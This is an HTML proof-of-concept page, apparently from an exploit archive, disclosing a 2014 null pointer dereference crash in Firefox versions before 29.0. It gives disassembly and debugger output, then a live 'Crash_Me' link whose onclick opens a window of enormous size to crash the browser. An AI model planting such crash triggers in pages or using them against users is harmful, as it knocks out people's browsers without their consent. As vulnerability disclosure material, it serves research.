@@ -1,0 +1,42 @@
+<html>
+<title>Mozilla Firefox Null Pointer Dereference Vulnerability</title>
+<pre>
+Fun side of life!
+<br>
+Details:
+	Title: Mozilla Firefox Null Pointer Dereference Vulnerability
+	Version: Prior to 29.0
+	Date: 4/30/2014
+	Discovered By: Mr.XHat
+	E-Mail: Mr.XHat {AT} GMail.com
+	Tested On: Windows 7 x64 EN
+###################################
+Disassembly:
+	01694240 8bc2            mov     eax,edx
+	01694242 d9e0            fchs
+	01694244 8b550c          mov     edx,dword ptr [ebp+0Ch]
+	01694247 d95c2418        fstp    dword ptr [esp+18h]
+	0169424b 8b1a            mov     ebx,dword ptr [edx]  ds:0023:00000000=????????
+	0169424d d9442418        fld     dword ptr [esp+18h]
+	01694251 8d4c2420        lea     ecx,[esp+20h]
+	01694255 d9c0            fld     st(0)
+	01694257 51              push    ecx
+============================================
+Output:
+	(e0.544): Access violation - code c0000005 (first chance)
+	First chance exceptions are reported before any exception handling.
+	This exception may be expected and handled.
+	eax=07e1fd00 ebx=0994bf90 ecx=000001f8 edx=00000000 esi=000000a8 edi=00000000
+	eip=0169424b esp=0012c8f0 ebp=0012c940 iopl=0         nv up ei pl nz na po nc
+	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+	*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Mozilla Firefox\xul.dll - 
+	xul!NS_NewLocalFile+0x2a49c:
+	0169424b 8b1a            mov     ebx,dword ptr [edx]  ds:0023:00000000=????????
+#######################################################################################
+</pre>
+<a href="javascript:_Launch_Website_In_Floating_Window_()"
+onclick="window.open('about:blank','1','toolbar=yes,location=yes,directories=yes,status=yes,menubar=yes,scrollbars=yes,resizable=yes,width=9999999999,height=9999999999');"
+>Crash_Me</a>
+<br><br>
+I kill you again!
+</html>
